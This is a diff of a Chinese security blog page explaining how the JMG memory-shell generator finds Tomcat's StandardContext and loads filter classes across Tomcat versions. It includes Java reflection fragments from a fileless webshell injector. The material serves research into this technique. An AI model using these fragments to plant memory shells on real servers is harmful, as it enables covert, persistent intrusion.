&#123;</span><br><span class="line">                                contexts.add(context);</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> (context != <span class="literal">null</span> &amp;&amp; context.getClass().getName().contains(<span class="string">&quot;TomcatEmbeddedContext&quot;</span>)) &#123;</span><br><span class="line">                                contexts.add(context);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (thread.getContextClassLoader() != <span class="literal">null</span> &amp;&amp; (thread.getContextClassLoader().getClass().toString().contains(<span class="string">&quot;ParallelWebappClassLoader&quot;</span>) || thread.getContextClassLoader().getClass().toString().contains(<span class="string">&quot;TomcatEmbeddedWebappClassLoader&quot;</span>))) &#123;</span><br><span class="line">                    context = getFV(getFV(thread.getContextClassLoader(), <span class="string">&quot;resources&quot;</span>), <span class="string">&quot;context&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (context != <span class="literal">null</span> &amp;&amp; context.getClass().getName().contains(<span class="string">&quot;StandardContext&quot;</span>)) &#123;</span><br><span class="line">                        contexts.add(context);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (context != <span class="literal">null</span> &amp;&amp; context.getClass().getName().contains(<span class="string">&quot;TomcatEmbeddedContext&quot;</span>)) &#123;</span><br><span class="line">                        contexts.add(context);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> contexts;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var14) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(var14);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 <p>总体其实就两个部分，一个是for循环遍历整个线程，二是判断当前遍历的线程是否为ContainerBackgroundProcessor，以及当前线程下的ClassLoader是否为ParallelWebappClassLoader或TomcatEmbeddedWebappClassLoader。<br>我们一个一个来说：</p>
 <h2 id="0x01-ContainerBackgroundProcessor"><a href="#0x01-ContainerBackgroundProcessor" class="headerlink" title="0x01 ContainerBackgroundProcessor"></a>0x01 ContainerBackgroundProcessor</h2><p>抛开它在 Tomcat 中的作用，单论内存马构造，如果是 Tomcat678 的版本，ContainerBackgroundProcessor 是我们第一首选获取到的线程。（tomcat9 中它并不是不起作用了，而是从线程中获取不到了）<br>具体作用：</p>
 <blockquote>
 <p><strong>Tomcat的Engine会启动一个线程（就是ContainerBackgroundProcessor），该线程每10s会发送一个发送一个事件，监听到该事件的部署配置类会自动去扫描webapp文件夹下的war包，将其加载成一个Context，即启动一个web服务。同时，该线程还会调用子容器Engine、Host、Context、Wrapper各容器组件及与它们相关的其它组件的backgroundProcess方法。</strong></p>
 </blockquote>
-<p>功能决定了它其中必定封装了 StandardContext<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1722664955806-b4acaeaf-2c90-4f2e-9f05-095b97c1fb3f.png#averageHue=%23313337&clientId=u831cbf1e-60c3-4&from=paste&height=342&id=u3081b895&originHeight=642&originWidth=1277&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=182991&status=done&style=none&taskId=ua83d4f80-fd0f-444c-a66b-e1a1edcc776&title=&width=681.0666666666667'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1722664955806-b4acaeaf-2c90-4f2e-9f05-095b97c1fb3f.png#averageHue=%23313337&clientId=u831cbf1e-60c3-4&from=paste&height=342&id=u3081b895&originHeight=642&originWidth=1277&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=182991&status=done&style=none&taskId=ua83d4f80-fd0f-444c-a66b-e1a1edcc776&title=&width=681.0666666666667" referrerpolicy="no-referrer" alt="image.png"><br>如何去取呢？我们观察上面这张图的取值结构，ContainerBackgroundProcessor 名称的 thread 中，属性值 target 封装了 ContainerBackgroundProcessor，将它取出之后，此时的 ContainBase 的具体实现是 StandardEngine，也就是说我们此时通过取出 ContainerBackgroundProcessor 的外部类，就能取到 StandardEngine，之后就是 StandardEngine-&gt;StandardHost-&gt;StandardContext 的顺序取出了<br>在 JMG 生成的 getContext 的具体代码中,具体就是第一段 if 了</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (thread.getName().contains(<span class="hljs-string">&quot;ContainerBackgroundProcessor&quot;</span>) &amp;&amp; context == <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-type">HashMap</span> <span class="hljs-variable">childrenMap</span> <span class="hljs-operator">=</span> (HashMap)getFV(getFV(getFV(thread, <span class="hljs-string">&quot;target&quot;</span>), <span class="hljs-string">&quot;this$0&quot;</span>), <span class="hljs-string">&quot;children&quot;</span>);<br>                    <span class="hljs-type">Iterator</span> <span class="hljs-variable">var9</span> <span class="hljs-operator">=</span> childrenMap.keySet().iterator();<br><br>                    <span class="hljs-keyword">while</span>(var9.hasNext()) &#123;<br>                        <span class="hljs-type">Object</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> var9.next();<br>                        <span class="hljs-type">HashMap</span> <span class="hljs-variable">children</span> <span class="hljs-operator">=</span> (HashMap)getFV(childrenMap.get(key), <span class="hljs-string">&quot;children&quot;</span>);<br>                        <span class="hljs-type">Iterator</span> <span class="hljs-variable">var12</span> <span class="hljs-operator">=</span> children.keySet().iterator();<br><br>                        <span class="hljs-keyword">while</span>(var12.hasNext()) &#123;<br>                            <span class="hljs-type">Object</span> <span class="hljs-variable">key1</span> <span class="hljs-operator">=</span> var12.next();<br>                            context = children.get(key1);<br>                            <span class="hljs-keyword">if</span> (context != <span class="hljs-literal">null</span> &amp;&amp; context.getClass().getName().contains(<span class="hljs-string">&quot;StandardContext&quot;</span>)) &#123;<br>                                contexts.add(context);<br>                            &#125;<br><br>                            <span class="hljs-keyword">if</span> (context != <span class="hljs-literal">null</span> &amp;&amp; context.getClass().getName().contains(<span class="hljs-string">&quot;TomcatEmbeddedContext&quot;</span>)) &#123;<br>                                contexts.add(context);<br>                            &#125;<br>                        &#125;<br>                    &#125;<br></code></pre></td></tr></table></figure>
+<p>功能决定了它其中必定封装了 StandardContext<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1722664955806-b4acaeaf-2c90-4f2e-9f05-095b97c1fb3f.png#averageHue=%23313337&clientId=u831cbf1e-60c3-4&from=paste&height=342&id=u3081b895&originHeight=642&originWidth=1277&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=182991&status=done&style=none&taskId=ua83d4f80-fd0f-444c-a66b-e1a1edcc776&title=&width=681.0666666666667" referrerpolicy="no-referrer" alt="image.png"><br>如何去取呢？我们观察上面这张图的取值结构，ContainerBackgroundProcessor 名称的 thread 中，属性值 target 封装了 ContainerBackgroundProcessor，将它取出之后，此时的 ContainBase 的具体实现是 StandardEngine，也就是说我们此时通过取出 ContainerBackgroundProcessor 的外部类，就能取到 StandardEngine，之后就是 StandardEngine-&gt;StandardHost-&gt;StandardContext 的顺序取出了<br>在 JMG 生成的 getContext 的具体代码中,具体就是第一段 if 了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (thread.getName().contains(<span class="string">&quot;ContainerBackgroundProcessor&quot;</span>) &amp;&amp; context == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">HashMap</span> <span class="variable">childrenMap</span> <span class="operator">=</span> (HashMap)getFV(getFV(getFV(thread, <span class="string">&quot;target&quot;</span>), <span class="string">&quot;this$0&quot;</span>), <span class="string">&quot;children&quot;</span>);</span><br><span class="line">                    <span class="type">Iterator</span> <span class="variable">var9</span> <span class="operator">=</span> childrenMap.keySet().iterator();</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">while</span>(var9.hasNext()) &#123;</span><br><span class="line">                        <span class="type">Object</span> <span class="variable">key</span> <span class="operator">=</span> var9.next();</span><br><span class="line">                        <span class="type">HashMap</span> <span class="variable">children</span> <span class="operator">=</span> (HashMap)getFV(childrenMap.get(key), <span class="string">&quot;children&quot;</span>);</span><br><span class="line">                        <span class="type">Iterator</span> <span class="variable">var12</span> <span class="operator">=</span> children.keySet().iterator();</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">while</span>(var12.hasNext()) &#123;</span><br><span class="line">                            <span class="type">Object</span> <span class="variable">key1</span> <span class="operator">=</span> var12.next();</span><br><span class="line">                            context = children.get(key1);</span><br><span class="line">                            <span class="keyword">if</span> (context != <span class="literal">null</span> &amp;&amp; context.getClass().getName().contains(<span class="string">&quot;StandardContext&quot;</span>)) &#123;</span><br><span class="line">                                contexts.add(context);</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> (context != <span class="literal">null</span> &amp;&amp; context.getClass().getName().contains(<span class="string">&quot;TomcatEmbeddedContext&quot;</span>)) &#123;</span><br><span class="line">                                contexts.add(context);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br></pre></td></tr></table></figure>
 <h2 id="0x02-Tomcat9-之后的路"><a href="#0x02-Tomcat9-之后的路" class="headerlink" title="0x02 Tomcat9 之后的路"></a>0x02 Tomcat9 之后的路</h2><p>之后就是 Tomcat9 版本之后的内容，ContainerBackgroundProcessor（standardEngine） 无法通过遍历线程获取到了，但是此时我们有另一种方法，就是直接判断该线程的 ContextClassLoader 是否为<code>ParallelWebappClassLoader</code>或者<code>TomcatEmbeddedWebappClassLoader</code>，然后再根据老一套的 ContextClassLoader-&gt;ContextRoot-&gt;StandardContext 逻辑将 context 取出。这里其实还有一条路，就是通过Acceptor 的线程去拿 StandardContext。这个方法固然很好，但是问题在于，如果遇到了 Snakeyaml 的 ScriptEngineManager 中指定的 ClassLoader 是 URLClassLoder，就加载不到一些重要的类，所以我们很有必要获取到一个能够完成绝大部分类加载的 ClassLoader，<code>ParallelWebappClassLoader``TomcatEmbeddedWebappClassLoader</code>都是这样的 Loader，并且他们还能拿到 Context<br>JMG 中的具体的代码如下:</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (thread.getContextClassLoader() != <span class="hljs-literal">null</span> &amp;&amp; (thread.getContextClassLoader().getClass().toString().contains(<span class="hljs-string">&quot;ParallelWebappClassLoader&quot;</span>) || thread.getContextClassLoader().getClass().toString().contains(<span class="hljs-string">&quot;TomcatEmbeddedWebappClassLoader&quot;</span>))) &#123;<br>                    context = getFV(getFV(thread.getContextClassLoader(), <span class="hljs-string">&quot;resources&quot;</span>), <span class="hljs-string">&quot;context&quot;</span>);<br>                    <span class="hljs-keyword">if</span> (context != <span class="hljs-literal">null</span> &amp;&amp; context.getClass().getName().contains(<span class="hljs-string">&quot;StandardContext&quot;</span>)) &#123;<br>                        contexts.add(context);<br>                    &#125;<br><br>                    <span class="hljs-keyword">if</span> (context != <span class="hljs-literal">null</span> &amp;&amp; context.getClass().getName().contains(<span class="hljs-string">&quot;TomcatEmbeddedContext&quot;</span>)) &#123;<br>                        contexts.add(context);<br>                    &#125;<br>                &#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (thread.getContextClassLoader() != <span class="literal">null</span> &amp;&amp; (thread.getContextClassLoader().getClass().toString().contains(<span class="string">&quot;ParallelWebappClassLoader&quot;</span>) || thread.getContextClassLoader().getClass().toString().contains(<span class="string">&quot;TomcatEmbeddedWebappClassLoader&quot;</span>))) &#123;</span><br><span class="line">                    context = getFV(getFV(thread.getContextClassLoader(), <span class="string">&quot;resources&quot;</span>), <span class="string">&quot;context&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (context != <span class="literal">null</span> &amp;&amp; context.getClass().getName().contains(<span class="string">&quot;StandardContext&quot;</span>)) &#123;</span><br><span class="line">                        contexts.add(context);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (context != <span class="literal">null</span> &amp;&amp; context.getClass().getName().contains(<span class="string">&quot;TomcatEmbeddedContext&quot;</span>)) &#123;</span><br><span class="line">                        contexts.add(context);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure>
 <p>之后还需要注意的一点就是 Class.forName 加载 Tomcat 类的时候，一定要指定 ClassLoader。</p>
 <h1 id="tomcat-版本不同中关键组件的获取"><a href="#tomcat-版本不同中关键组件的获取" class="headerlink" title="tomcat 版本不同中关键组件的获取"></a>tomcat 版本不同中关键组件的获取</h1><p>具体的实现代码如下</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ClassLoader</span> <span class="hljs-variable">catalinaLoader</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getCatalinaLoader();<br><span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.classLoader == <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-built_in">this</span>.classLoader = Thread.currentThread().getContextClassLoader();<br>            &#125;<br><br>            filterDef = Class.forName(<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span>, <span class="hljs-literal">true</span>, <span class="hljs-built_in">this</span>.classLoader).newInstance();<br>            filterMap = Class.forName(<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span>, <span class="hljs-literal">true</span>, <span class="hljs-built_in">this</span>.classLoader).newInstance();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var19) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                filterDef = Class.forName(<span class="hljs-string">&quot;org.apache.catalina.deploy.FilterDef&quot;</span>, <span class="hljs-literal">true</span>, <span class="hljs-built_in">this</span>.classLoader).newInstance();<br>                filterMap = Class.forName(<span class="hljs-string">&quot;org.apache.catalina.deploy.FilterMap&quot;</span>, <span class="hljs-literal">true</span>, <span class="hljs-built_in">this</span>.classLoader).newInstance();<br>            &#125; <span class="hljs-keyword">catch</span> (Exception var18) &#123;<br>                filterDef = Class.forName(<span class="hljs-string">&quot;org.apache.catalina.deploy.FilterDef&quot;</span>, <span class="hljs-literal">true</span>, catalinaLoader).newInstance();<br>                filterMap = Class.forName(<span class="hljs-string">&quot;org.apache.catalina.deploy.FilterMap&quot;</span>, <span class="hljs-literal">true</span>, catalinaLoader).newInstance();<br>            &#125;<br>        &#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ClassLoader</span> <span class="variable">catalinaLoader</span> <span class="operator">=</span> <span class="built_in">this</span>.getCatalinaLoader();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.classLoader == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="built_in">this</span>.classLoader = Thread.currentThread().getContextClassLoader();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            filterDef = Class.forName(<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span>, <span class="literal">true</span>, <span class="built_in">this</span>.classLoader).newInstance();</span><br><span class="line">            filterMap = Class.forName(<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span>, <span class="literal">true</span>, <span class="built_in">this</span>.classLoader).newInstance();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var19) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                filterDef = Class.forName(<span class="string">&quot;org.apache.catalina.deploy.FilterDef&quot;</span>, <span class="literal">true</span>, <span class="built_in">this</span>.classLoader).newInstance();</span><br><span class="line">                filterMap = Class.forName(<span class="string">&quot;org.apache.catalina.deploy.FilterMap&quot;</span>, <span class="literal">true</span>, <span class="built_in">this</span>.classLoader).newInstance();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var18) &#123;</span><br><span class="line">                filterDef = Class.forName(<span class="string">&quot;org.apache.catalina.deploy.FilterDef&quot;</span>, <span class="literal">true</span>, catalinaLoader).newInstance();</span><br><span class="line">                filterMap = Class.forName(<span class="string">&quot;org.apache.catalina.deploy.FilterMap&quot;</span>, <span class="literal">true</span>, catalinaLoader).newInstance();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
 <p><code>org.apache.tomcat.util.descriptor.web</code>主要适用于 tomcat9 之后<br><code>org.apache.catalina.deploy</code>主要适用于 tomcat8 以及之前较老的版本<br>还有一些关键组件，因为版本不同，比如 <code>javax.servlet.Filter</code>和<code>jakarta.servlet.Filter</code>，具体就是 tomcat9 之前和 tomcat9 之后的 tomcat10 的版本不同，导致报名不同的问题，处理的逻辑如下：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><br>Class clazz;<br><span class="hljs-keyword">try</span> &#123;<br>    clazz = Class.forName(<span class="hljs-string">&quot;javax.servlet.Filter&quot;</span>, <span class="hljs-literal">true</span>, <span class="hljs-built_in">this</span>.classLoader);<br>&#125; <span class="hljs-keyword">catch</span> (Exception var16) &#123;<br>    clazz = Class.forName(<span class="hljs-string">&quot;jakarta.servlet.Filter&quot;</span>, <span class="hljs-literal">true</span>, <span class="hljs-built_in">this</span>.classLoader);<br>&#125;<br></code></pre></td></tr></table></figure>
-<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/post/Spring%20Cloud%20Data%20Flow%20_%202.11.3%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%20CVE-2024-22263%E5%88%86%E6%9E%90.html">← 下一篇 Spring Cloud Skipper _ 2.11.3 任意文件写入 CVE-2024-22263分析</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/post/%E5%86%85%E5%AD%98%E9%A9%AC%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF.html">Tomcat型内存马回显以及反序列化写入 上一篇 →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/logo/D5B030D454D35C3F06BCF706E7F7948A.png" alt="Logo"></a><h1 id="Dr"><a href="/">stoocea</a></h1><div id="description"><p>time thicking away</p></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96StandardContext%E7%9A%84%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93"><span class="toc-number">1.</span> <span class="toc-text">获取StandardContext的思路总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%AF%A6%E8%A7%A3%E9%81%8D%E5%8E%86%E7%BA%BF%E7%A8%8B%E8%8E%B7%E5%8F%96StandardContext"><span class="toc-number">2.</span> <span class="toc-text">详解遍历线程获取StandardContext</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-ContainerBackgroundProcessor"><span class="toc-number">2.1.</span> <span class="toc-text">0x01 ContainerBackgroundProcessor</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Tomcat9-%E4%B9%8B%E5%90%8E%E7%9A%84%E8%B7%AF"><span class="toc-number">2.2.</span> <span class="toc-text">0x02 Tomcat9 之后的路</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#tomcat-%E7%89%88%E6%9C%AC%E4%B8%8D%E5%90%8C%E4%B8%AD%E5%85%B3%E9%94%AE%E7%BB%84%E4%BB%B6%E7%9A%84%E8%8E%B7%E5%8F%96"><span class="toc-number">3.</span> <span class="toc-text">tomcat 版本不同中关键组件的获取</span></a></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> 主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas></body></html>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Class clazz;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    clazz = Class.forName(<span class="string">&quot;javax.servlet.Filter&quot;</span>, <span class="literal">true</span>, <span class="built_in">this</span>.classLoader);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception var16) &#123;</span><br><span class="line">    clazz = Class.forName(<span class="string">&quot;jakarta.servlet.Filter&quot;</span>, <span class="literal">true</span>, <span class="built_in">this</span>.classLoader);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/Stoocea">项目</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96StandardContext%E7%9A%84%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93"><span class="toc-number">1.</span> <span class="toc-text">获取StandardContext的思路总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%AF%A6%E8%A7%A3%E9%81%8D%E5%8E%86%E7%BA%BF%E7%A8%8B%E8%8E%B7%E5%8F%96StandardContext"><span class="toc-number">2.</span> <span class="toc-text">详解遍历线程获取StandardContext</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-ContainerBackgroundProcessor"><span class="toc-number">2.1.</span> <span class="toc-text">0x01 ContainerBackgroundProcessor</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Tomcat9-%E4%B9%8B%E5%90%8E%E7%9A%84%E8%B7%AF"><span class="toc-number">2.2.</span> <span class="toc-text">0x02 Tomcat9 之后的路</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#tomcat-%E7%89%88%E6%9C%AC%E4%B8%8D%E5%90%8C%E4%B8%AD%E5%85%B3%E9%94%AE%E7%BB%84%E4%BB%B6%E7%9A%84%E8%8E%B7%E5%8F%96"><span class="toc-number">3.</span> <span class="toc-text">tomcat 版本不同中关键组件的获取</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/post/Memshell%E5%86%8D%E7%A0%94%E7%A9%B6.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/post/Memshell%E5%86%8D%E7%A0%94%E7%A9%B6.html&text=Memshell再研究之Tomcat"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/post/Memshell%E5%86%8D%E7%A0%94%E7%A9%B6.html&title=Memshell再研究之Tomcat"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/post/Memshell%E5%86%8D%E7%A0%94%E7%A9%B6.html&is_video=false&description=Memshell再研究之Tomcat"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Memshell再研究之Tomcat&body=Check out this article: http://example.com/post/Memshell%E5%86%8D%E7%A0%94%E7%A9%B6.html"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/post/Memshell%E5%86%8D%E7%A0%94%E7%A9%B6.html&title=Memshell再研究之Tomcat"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/post/Memshell%E5%86%8D%E7%A0%94%E7%A9%B6.html&title=Memshell再研究之Tomcat"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/post/Memshell%E5%86%8D%E7%A0%94%E7%A9%B6.html&title=Memshell再研究之Tomcat"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/post/Memshell%E5%86%8D%E7%A0%94%E7%A9%B6.html&title=Memshell再研究之Tomcat"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/post/Memshell%E5%86%8D%E7%A0%94%E7%A9%B6.html&name=Memshell再研究之Tomcat&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/post/Memshell%E5%86%8D%E7%A0%94%E7%A9%B6.html&t=Memshell再研究之Tomcat"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024
+    stoocea
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
